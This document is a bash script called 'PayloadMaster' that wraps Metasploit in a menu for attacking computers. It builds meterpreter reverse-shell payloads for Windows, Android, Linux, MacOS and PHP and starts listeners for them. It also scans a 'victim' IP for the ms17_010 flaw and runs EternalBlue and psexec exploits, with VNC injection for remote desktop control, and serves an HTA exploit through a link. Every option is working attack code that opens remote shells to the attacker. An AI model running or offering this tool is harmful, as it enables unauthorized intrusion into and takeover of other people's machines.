#!/bin/bash

# Set dimensions for the terminal window
resize -s 27 80
clear

# Get the local IP address automatically
ip=$(hostname -I | cut -d' ' -f1)

# Start PostgreSQL service (Metasploit Framework requirement)
service postgresql start

# Run until the user decides to quit
while true; do
  clear

  echo "==========================================="
  echo "Welcome to PayloadMaster"
  echo "==========================================="
  echo "Select an option:"
  echo "(1) Windows --> Create Windows payload and listener"
  echo "(2) Android --> Create Android payload and listener"
  echo "(3) Linux --> Create Linux payload and listener"
  echo "(4) MacOS --> Create MacOS payload and listener"
  echo "(5) Web --> Create Web payload and listener"
  echo "(6) Scan if a target is vulnerable to ms17_010"
  echo "(7) Exploit Windows 7/2008 x64 ONLY by IP (ms17_010_eternalblue)"
  echo "(8) Enable Remote Desktop (ms17_010_eternalblue)"
  echo "(9) Exploit Windows Vista/XP/2000/2003 ONLY by IP (ms17_010_psexec)"
  echo "(10) Enable Remote Desktop (ms17_010_psexec)"
  echo "(11) Exploit Windows with a link (HTA Server)"
  echo "(q) Quit"
  read -p "Choice: " x

  case $x in
    1)
      read -p "Enter the name of the payload (without extension): " payload_name
      msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 -f exe > /root/Desktop/$payload_name.exe
      msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $ip; set LPORT 4444; exploit;"
      ;;
    2)
      read -p "Enter the name of the payload (without extension): " payload_name
      msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 > /root/Desktop/$payload_name.apk
      msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $ip; set LPORT 4444; exploit;"
      ;;
    3)
      read -p "Enter the name of the payload (without extension): " payload_name
      msfvenom -p python/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 > /root/Desktop/$payload_name.py
      msfconsole -q -x "use exploit/multi/handler; set payload python/meterpreter/reverse_tcp; set LHOST $ip; set LPORT 4444; exploit;"
      ;;
    4)
      read -p "Enter the name of the payload (without extension): " payload_name
      msfvenom -p java/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 -f jar > /root/Desktop/$payload_name.jar
      msfconsole -q -x "use exploit/multi/handler; set payload java/meterpreter/reverse_tcp; set LHOST $ip; set LPORT 4444; exploit;"
      ;;
    5)
      read -p "Enter the name of the payload (without extension): " payload_name
      msfvenom -p php/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 > /root/Desktop/$payload_name.php
      msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST $ip; set LPORT 4444; exploit;"
      ;;
    6)
      echo "Victim's IP:"
      read r
      msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS $r; exploit; exit;"
      ;;
    7)
      echo "Victim's IP:"
      read r
      msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $ip; set RHOST $r; exploit;"
      ;;
    8)
      echo "Victim's IP:"
      read r
      msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/vncinject/reverse_tcp; set LHOST $ip; set RHOST $r; set viewonly false; exploit;"
      ;;
    9)
      echo "Victim's IP:"
      read r
      msfconsole -q -x "use exploit/windows/smb/ms17_010_psexec; set LHOST $ip; set RHOST $r; exploit;"
      ;;
    10)
      echo "Victim's IP:"
      read r
      msfconsole -q -x "use exploit/windows/smb/ms17_010_psexec; set payload windows/vncinject/reverse_tcp; set LHOST $ip; set RHOST $r; set viewonly false; exploit;"
      ;;
    11)
      echo 'Uripath: (/)'
      read u
      msfconsole -q -x "use exploit/windows/misc/hta_server; set SRVHOST $ip; set URIPATH /$u; set payload windows/meterpreter/reverse_tcp; set LHOST $ip; exploit;"
      ;;
    q)
      echo "Quitting..."
      exit 0
      ;;
    *)
      echo "Invalid option. Please try again."
      ;;
  esac
done

